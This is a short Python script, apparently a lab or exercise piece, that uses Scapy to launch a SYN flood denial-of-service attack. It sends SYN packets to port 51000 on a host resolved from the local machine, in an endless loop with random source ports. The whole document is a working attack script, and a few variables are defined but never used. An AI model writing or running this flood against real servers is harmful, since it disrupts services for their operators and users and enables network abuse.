import random
from scapy.all import *
from scapy.layers.inet import IP, TCP

def syn_flood():
    """
    Function attacks server with syn flood
    """
    ip_packet = IP(src="10.0.0.12", dst=HOST)

    # TCP packet with SYN flag set
    tcp_packet = TCP(dport=PORT, flags='S') / "ATTACK"

    # picking random port
    tcp_packet.sport = RandShort()

    print("----Attacking with SYN FLOOD----")
    send(ip_packet / tcp_packet, loop=1, inter=0.2, verbose=0, iface=get_working_if())


# server ip to attack
if len(socket.gethostbyname_ex(socket.gethostname())[-1]) > 1:
    HOST = socket.gethostbyname_ex(socket.gethostname())[-1][0]
else:
    HOST = socket.gethostbyname_ex(socket.gethostname())[-1][-1]

# server port to attack
for iface in get_working_ifaces():
    if iface.ip == HOST:
        interface = iface

PORT = 51000
ADDR = ("192.168.1.18", PORT)

syn_flood()
